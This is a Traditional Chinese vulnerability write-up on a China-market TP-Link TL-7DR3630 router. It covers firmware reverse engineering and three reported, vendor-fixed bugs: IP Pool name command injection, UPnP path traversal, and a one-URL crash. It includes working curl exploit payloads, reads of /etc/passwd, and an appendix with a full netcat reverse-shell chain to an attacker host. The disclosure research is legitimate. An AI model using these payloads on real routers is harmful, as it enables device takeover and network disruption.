---
title: (繁中) 中國版 TP-Link 路由器的漏洞研究
description: 逆向一台中國版 TP-Link 路由器，並順手挖到三個漏洞
date: 2026-06-09 00:00:01 +0800
---

### _**Hey! This article is also available in [English](/posts/hacking-tp-link-router-en/) and [简体中文](/posts/hacking-tp-link-router-zh/).**_

# 開頭

前陣子，我逆向了一台中國版 TP-Link 家用路由器，並順手挖出了三個安全漏洞。它們分別是：

- 一個遠端程式碼執行（RCE）漏洞
- 一個透過路徑穿越實現的任意檔案讀取漏洞
- 一個阻斷服務（DoS）漏洞

這是我第一次在 CTF 之外挖到真實世界裡的安全漏洞。希望這個故事讀起來也會有點意思 :)

PoC 程式碼放在我的 [GitHub repository](https://github.com/ALaggyDev/TPLink-Vulns) 裡。

# 路由器

**重要說明： TP-Link 有分兩家公司：[TP-Link（國際）](https://www.tp-link.com/) 和 [TP-Link（中國）](https://www.tp-link.com.cn/)。這兩家公司獨立營運，產品也不一樣。下文提到的 “TP-Link”，預設都是指 TP-Link（中國）。**

幾個月前，我在淘寶上買了一台便宜的 TP-Link Wi-Fi 7 路由器，型號是 TL-7DR3630 V4.0，價格大概 200 人民幣。

{% include image-caption.html src="/assets/img/tp-link/router.png" alt="Image of the router" caption="[TP-Link TL-7DR3630 V4.0](https://www.tp-link.com.cn/product_4081.html)" %}

在這個價位裡，它大概是最划算的 Wi-Fi 7 路由器了。唯一比較可惜的是，因為中國大陸的頻段限制，它不支援 6 GHz。

不過，既然這是面向中國市場的路由器，它出廠自然帶的是鎖得比較死的中文韌體。我本來想給它刷 [OpenWrt](https://openwrt.org/)，但很遺憾，這台路由器只接受 TP-Link 簽名過的韌體更新。於是我決定把韌體拿來逆向一下，看看裡面有沒有什麼可以利用的漏洞。

之前我看到有人在類似型號的 TP-Link 路由器 TL-XDR6086 上找到過一個 [遠端程式碼執行（RCE）漏洞](https://forum.openwrt.org/t/adding-support-for-tp-link-xdr-6086/140637/16)，後來還借這個漏洞給那台路由器編譯了 OpenWrt。我當時也抱著類似的期待：如果能在我的型號上找到差不多的漏洞，說不定也能順手把 OpenWrt 刷進去。*(但後來我發現，要給我這台路由器編譯主線 OpenWrt 基本上是不現實的。)*

# 逆向韌體

首先，這個專案離不開前面那些研究者鋪過的路。這裡必須感謝這些很厲害的前輩和文章：

- [https://forum.openwrt.org/t/adding-support-for-tp-link-xdr-6086/140637/16](https://forum.openwrt.org/t/adding-support-for-tp-link-xdr-6086/140637/16)
- [https://bbs.kanxue.com/thread-289107.htm](https://bbs.kanxue.com/thread-289107.htm)
- [https://www.ctfiot.com/36044.html](https://www.ctfiot.com/36044.html)
- [https://www.m4rg4tr01d.tech/archives/tplink](https://www.m4rg4tr01d.tech/archives/tplink)
- [https://github.com/fishykz/TP-POC](https://github.com/fishykz/TP-POC)

我先從 TP-Link 官網下載了韌體，然後把它解包。第一步當然是丟給 `binwalk` 看看：

```bash
└─$ binwalk TL-7DR3630\ V4.0_1.0.16_Build_20250717_Rel.74184.bin

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
512           0x200           LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 439904 bytes
393728        0x60200         uImage header, header size: 64 bytes, header CRC: 0x118E985, created: 2025-07-17 13:22:35, image size: 4554040 bytes, Data Address: 0x80208000, Entry Point: 0x80208000, data CRC: 0x5EAFB8AF, OS: Linux, CPU: ARM, image type: OS Kernel Image, compression type: none, image name: "Linux-5.10.0"
393792        0x60240         Linux kernel ARM boot executable zImage (little-endian)
402945        0x62601         LZMA compressed data, properties: 0x6D, dictionary size: 1048576 bytes, uncompressed size: -1 bytes
4947832       0x4B7F78        Flattened device tree, size: 68116 bytes, version: 17
5009340       0x4C6FBC        Unix path: /usr/sbin/hi_dsp_ec.bin
5898752       0x5A0200        Squashfs filesystem, little endian, version 4.0, compression:xz, size: 28819566 bytes, 2780 inodes, blocksize: 524288 bytes, created: 2025-07-17 13:22:52
```

可以看到，這個韌體裡至少有 Linux kernel、device tree，以及一個 SquashFS 檔案系統。

接著我用 `dd` 把 SquashFS 檔案系統切出來，再用 `unsquashfs` 解開：

```bash
dd if=TL-7DR3630\ V4.0_1.0.16_Build_20250717_Rel.74184.bin iflag=count_bytes,skip_bytes skip=5898752 count=28819566 of=filesystem.squashfs

unsquashfs filesystem.squashfs
```

解完之後，就可以開始逛檔案系統了：

```bash
└─$ ls
autoPlugin  conf    data      dev  lib  opt      proc  root  sys  usr  web
bin         config  database  etc  mnt  overlay  rom   sbin  tmp  var  www
```

```bash
└─$ cat /etc/openwrt_release
DISTRIB_ID="OpenWrt"
DISTRIB_RELEASE="Chaos Calmer"
DISTRIB_REVISION="8be5e6b34e4f9163630aebaff3787e3274b888ed"
DISTRIB_CODENAME="chaos_calmer"
DISTRIB_TARGET="hsan/tiangong1"
DISTRIB_DESCRIPTION="OpenWrt Chaos Calmer 15.05.1"
```

```bash
└─$ ls conf
apdb.json                          hostapd                 server-cert.pem
behave_manage.cap                  hosts_info.cap          tdcpIntValList.json
cfgSyncBlackList.xml               model.xml               template
cfgSyncEncodeList.json             modulePrivateAttr.json  tp-link-root-CA.pem
cfgSyncWhiteList.xml               oem.xml                 vpn.cap
cloud_relay_client_capability.cap  priv-key.pem            wireless_ap.cap
common_module.cap                  protocol.cap            wireless.cap
digiCert-global-root-CA.pem        radio.cap               wpa_supplicant
flash_sign_pk.pem                  radioExtra.cap
```

這個韌體基於 OpenWrt 15.05.1，已經是八年前的版本了。Linux kernel 版本是 5.10.0。雖然底子是 OpenWrt，但它和主線 OpenWrt 差異非常大，看起來 TP-Link 做了相當多的客製化。

檔案系統裡有不少值得看的東西。`conf` 目錄裡是設定檔，包括憑證和私鑰；`lib` 目錄裡有很多 TP-Link 自己的邏輯；`web` 目錄則是路由器 Web 管理介面的檔案。

# dms 程式

根據我查到的資料，這套路由器的主要功能都在 `/bin/dms` 這個程式裡。它負責處理 Web 管理介面，也負責一些其他功能。所以我決定先重點研究它。

```bash
└─$ file bin/dms
bin/dms: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-arm.so.1, no section header

└─$ pwn checksec bin/dms
[!] Did not find any GOT entries
[*] '/home/laggy/TL-7DR3630/squashfs-root/bin/dms'
    Arch:       arm-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x10000)
```

我把 `dms` 丟進 Ghidra 裡開始看。比較幸運的是，這個二進位檔沒有被移除符號表（strip），所以大部分函式名稱還在。

![Ghidra view](/assets/img/tp-link/ghidra.png)

我的目標是找遠端程式碼執行漏洞（RCE），所以先從所有可能執行 Linux 指令的函式呼叫入手：

- `system`
- `systemExec`
- `systemAsyncExec`
- `formattedExec`
- `popen`

這些函式加起來大概有 120 個呼叫點（XREF）。於是，我一個個手動看過去，檢查有沒有把使用者輸入拼進指令參數裡的地方。

最後，我在 `vpnIppoolNotify` 函式裡發現了這段程式碼：

![VPN IPPool](/assets/img/tp-link/command_injection.png)

簡單來說，路由器的 VPN 設定裡有一個叫 “IP Pool” 的功能。使用者可以建立一個 IP Pool，並給它設定名稱和 IP 範圍。

當使用者建立或刪除 IP Pool 時，程式碼會使用這個格式字串：`ippool-control -a -n %s -b %s -e %s`。第一個 `%s` 是 IP Pool 名稱，第二和第三個 `%s` 分別是 IP 範圍的起始和結束位址。然後程式碼會呼叫 `systemAsyncExec` 去執行拼出來的指令。

關鍵點來了：IP Pool 名稱沒有輸入驗證。也就是說，我們可以把指令注入到名稱裡，讓路由器執行任意指令。RCE 到手！

為了測試，我建立了一個名字叫 `; reboot &` 的 IP Pool。拼出來的指令就變成了 `ippool-control -a -n ; reboot & -b 2.2.2.2 -e 2.2.2.2`。不出所料，路由器重啟了。

```bash
curl -X POST -d '{"ippool":{"table":"ippool","para":{"name":"; reboot &","start_ip":"2.2.2.2","end_ip":"2.2.2.2","ref":"0"},"name":"ippool_1"},"method":"add"}' http://192.168.1.1/stok=<STOK_TOKEN>/ds
```

不過 IP Pool 名稱最多只能有 32 個字元，超過的部分會被截斷。所以 payload 需要寫得比較省。

借助下一節會講到的任意檔案讀取漏洞，我確認了指令是以 root 權限執行的。我建立了一個名字為 `; id > /tmp/hello &` 的 IP Pool，然後讀取 `/tmp/hello`：

```bash
uid=0(root) gid=0(root)
```

這個漏洞能玩的東西不少。比如可以用它起一個反向 shell，讓路由器連回我們的機器，從而拿到完整控制權。具體 payload 我放在了[附錄](#附錄reverse-shell-payload)裡。

不過，這個漏洞必須由能存取路由器管理後台的使用者觸發，所以還沒有那麼嚴重。下面兩個漏洞就更麻煩了 :)

# 任意檔案讀取

研究過程中，我還碰到了一個叫 `httpMGetHandle` 的函式：

![File read](/assets/img/tp-link/file_read.png)

這個函式負責處理 1900 連接埠上的 HTTP GET 請求，也就是 UPnP 服務。它會從 GET 請求裡取出路徑，在前面拼上 `/web/upnp`，然後讀取對應檔案，並把檔案內容放進 HTTP response 返回。

比如，如果我們請求 `http://192.168.1.1:1900/ifc.xml`，程式碼就會讀取 `/web/upnp/ifc.xml`，然後返回它的內容。

問題是，請求路徑同樣沒有輸入驗證。我們可以用 `../` 往上穿目錄，讀取路由器上的任意檔案。這就是一個路徑穿越漏洞！

例如，發送 GET 請求到 `http://192.168.1.1:1900/../../conf/model.xml`，就可以讀取 `/conf/model.xml`。

```bash
└─$ curl --path-as-is "http://192.168.1.1:1900/../../conf/oem.xml"
<root>
<oem name="oem_info">
        <device name="7dr3630mv4">
                <element name="fullName">TP-LINK Wireless Router TL-7DR3630</element>
...
```

*注意：普通 HTTP 客戶端可能會正規化路徑（path normalization），把 `../` 這類片段去掉。用 `curl` 測試時需要加 `--path-as-is`，讓它原樣發送路徑。*

可惜的是，這個路徑穿越漏洞沒有看起來那麼強。對於未認證使用者，程式碼會檢查檔案副檔名。也就是說：

- 未認證使用者（沒有登入管理後台的使用者）只能讀取這些副檔名的檔案：`.xml .gif .png .jpeg .ico .jpg .css .js .zip .eot .svg .ttf .woff`。
- 已認證使用者沒有檔案副檔名限制。

已認證使用者可以用類似下面的指令讀取路由器上的任意檔案：

```bash
curl --path-as-is "http://192.168.1.1:1900/stok=<STOK_TOKEN>/../../etc/passwd"
```

所以還算幸運的是，這個漏洞不能直接用來提權，因為在沒有管理後台存取權限的情況下，讀不到密碼檔案之類的敏感檔案。

# 一個 HTTP 請求崩潰路由器

我在測試路徑穿越漏洞時，隨手給路由器發了這個 HTTP GET 請求：`http://192.168.1.1:1900/../../etc/passwd?stok=abc`。結果路由器瞬間崩潰。我居然用一個簡單的 GET 請求把自己的路由器搞崩潰了。

這就必須得查清楚了。利用前面兩個漏洞，我拿到了 `dms` 崩潰時的 [core dump](https://en.wikipedia.org/wiki/Core_dump) 並下載下來。用 `gdb` 分析之後，可以很明顯地看到，崩潰是同一個 `httpMGetHandle` 函式裡的 assertion failure 導致的。

{% include image-caption.html src="/assets/img/tp-link/dos_2.png" alt="Assertion failure" caption="觸發崩潰的 assertion" %}

這個 assertion 會檢查 `context->path` 是否非空。如果 `context->path` 為空，assertion 就會失敗，然後路由器崩潰。

既然路由器是在這裡崩潰的，那說明 `context->path` 當時一定是空字串。但為什麼這個 URL 會讓 `context->path` 變空？

我繼續往下挖 TP-Link 的 HTTP 解析實作。在 `httpParseHeader` 函式裡，有這樣一段解析 URL 中 `stok` token（用於認證）的程式碼：

{% include image-caption.html src="/assets/img/tp-link/dos_1.png" alt="stok parsing" caption="`stok` token 解析邏輯" %}

一個典型的已認證請求長這樣：`http://192.168.1.1/stok=<STOK_TOKEN>/ds`。程式碼會在 URL 中尋找 `stok` token。如果找到了，它會繼續尋找 token 後面的下一個 `/` 字元，然後把 `context->path` 設定成這個 `/` 後面的字串（也就是 `/ds`）。

但是，如果 `stok` token 後面沒有 `/`，程式碼就會在無意中把 `context->path` 設定成空字串。我們的 URL 正好就是這種情況，因為 `stok` 後面沒有再出現 `/`。開發者大概沒有考慮到這個情況，於是後面 assertion 一炸，整個路由器也跟著炸。

## 影響

不幸的是，這個漏洞任何使用者都能觸發，因為程式碼在解析 `stok` token 之前並不會檢查 token 是否有效。也就是說，你只要在瀏覽器裡打開：`http://192.168.1.1:1900/stok=abc`，路由器就會崩潰。

而且，路由器崩潰後不會自動重啟。你必須手動拔電源再插回去，它才會重新開機。

這個影響還是挺嚴重的。假設你造訪了一個惡意網站。網站在你看不見的地方跑一段 JavaScript，向 `http://192.168.1.1:1900/stok=abc` 發請求。啪，路由器崩潰了，而你完全不知道為什麼。[^1]

[^1]: Chrome 最近實作了一個叫 [Local Network Access](https://developer.chrome.com/blog/local-network-access) 的保護機制，用來防止這類本地網路攻擊。不過這只意味著攻擊會對使用者可見。例如，攻擊者可以不在後台用 JavaScript 發請求，而是直接把使用者重新導向到這個 URL，來繞過這個保護機制。

再舉個更簡單的例子：有人給你發郵件或者簡訊，裡面塞了這個惡意 URL，而你點開了，路由器又崩潰了。

這個漏洞還有不少其他利用方式，這裡就留給讀者自己發揮了。

# 附錄：Reverse Shell Payload

*如果你對 reverse shell payload 不感興趣，可以跳過這一節。*

用這個 RCE 漏洞做 reverse shell，會比想像中麻煩一些。我們需要解決幾個問題：

- 指令 payload 最多只有 32 個字元，第 32 個字元之後的內容都會被截斷。
- 內建的 `busybox` 功能非常殘缺。`nc`、`curl`、`wget`、`base64` 都不在這個 `busybox` 裡。
- 每條指令都會執行兩次：建立 IP Pool 時執行一次，刪除 IP Pool 時又執行一次。

幸好這台路由器裡有個可以借用的東西。`/opt/game_acc/rootfs` 裡有一個 chroot 環境，正常情況下是給「遊戲加速」軟體用的（網易那些加速器，你知道的）。在 `/opt/game_acc/rootfs/bin/busybox` 裡，有一個完整的 `busybox`，裡面包含我們需要的 CLI 工具。

不過，完整路徑 `/opt/game_acc/rootfs/bin/busybox` 本身就已經 32 個字元了。所以我改用 `opt/*/*/*/busybox`，讓 shell expansion 幫我把它展開成完整路徑。

下面是實際在路由器上執行的指令：

```bash
ln -sf opt/*/*/*/busybox nc   # create a symlink /nc to busybox
ln -sf opt/*/*/*/busybox sh   # create a symlink /sh to busybox
/nc <remote_ip> 99 -e /sh     # create a reverse shell to our machine on port 99
```

在自己的機器上監聽 99 連接埠：

```bash
nc -lvnp 99
```

原始 payload：

```bash
# 把 <remote_ip> 替換成 IP 位址，把 <stok> 替換成 STOK token
curl -X POST -d '{"ippool":{"table":"ippool","para":{"name":";ln -sf opt/*/*/*/busybox nc&","start_ip":"2.2.2.2","end_ip":"2.2.2.2","ref":"0"},"name":"ippool_1"},"method":"add"}' http://192.168.1.1/stok=<stok>/ds
curl -X POST -d '{"ippool":{"name":["ippool_1"]},"method":"delete"}' http://192.168.1.1/stok=<stok>/ds
curl -X POST -d '{"ippool":{"table":"ippool","para":{"name":";ln -sf opt/*/*/*/busybox sh&","start_ip":"2.2.2.2","end_ip":"2.2.2.2","ref":"0"},"name":"ippool_1"},"method":"add"}' http://192.168.1.1/stok=<stok>/ds
curl -X POST -d '{"ippool":{"name":["ippool_1"]},"method":"delete"}' http://192.168.1.1/stok=<stok>/ds
curl -X POST -d '{"ippool":{"table":"ippool","para":{"name":";/nc <remote_ip> 99 -e /sh&","start_ip":"2.2.2.2","end_ip":"2.2.2.2","ref":"0"},"name":"ippool_1"},"method":"add"}' http://192.168.1.1/stok=<stok>/ds
curl -X POST -d '{"ippool":{"name":["ippool_1"]},"method":"delete"}' http://192.168.1.1/stok=<stok>/ds
```

```bash
exec 2>&1
echo hello can you read this
hello can you read this
```

Reverse shell 拿到了！從這裡開始，我們就完全控制這台路由器了 :D

# 總結

這次研究裡，我在中國版 TP-Link 的家用路由器軟體中發現了三個漏洞：

- VPN IP Pool 功能裡的遠端程式碼執行（RCE）漏洞
- UPnP 服務裡的任意檔案讀取漏洞
- UPnP 服務裡的阻斷服務（DoS）漏洞

我已經把這些漏洞報告給 TP-Link，他們也已經修復這些漏洞。我也把發現提交給了 [MITRE CVE Program](https://cve.mitre.org/)，不過到目前為止還沒有收到回覆。如果之後分配了 CVE ID，我會再更新這篇文章的。

時間線：

- 2026-04-28：透過郵件向 TP-Link 報告漏洞
- 2026-05-12：TP-Link 修復漏洞
- 2026-05-19：向 MITRE CVE Program 提交發現
- 2026-06-09：發布這篇文章

這次研究基本是在沒有 LLM 輔助的情況下完成的，而且我只花了大概三天就找到了這些漏洞。過程很有趣，但也有點令人擔憂。如果這種漏洞純靠手工都能這麼快挖出來，那麼 AI 輔助的漏洞研究大概會讓這類工作變得更快。防守方會更快，攻擊者也一樣。

我也覺得，這件事多少能反映出消費級路由器韌體的現狀。這些設備常年待在網路邊界，插上之後就很容易被忘掉。可是說到安全，它們經常又是被忽視的那一類。現在市場上大多數路由器都跑著閉源的專有軟體，也沒有很多安全研究員專門盯著這類設備做分析。隨著漏洞發現的成本越來越低、速度越來越快，廠商真的需要更認真地對待韌體安全了。

總之，希望你覺得這個故事有趣。謝謝你的閱讀！

連結：

- [GitHub](https://github.com/ALaggyDev)
- [Repo](https://github.com/ALaggyDev/TPLink-Vulns)
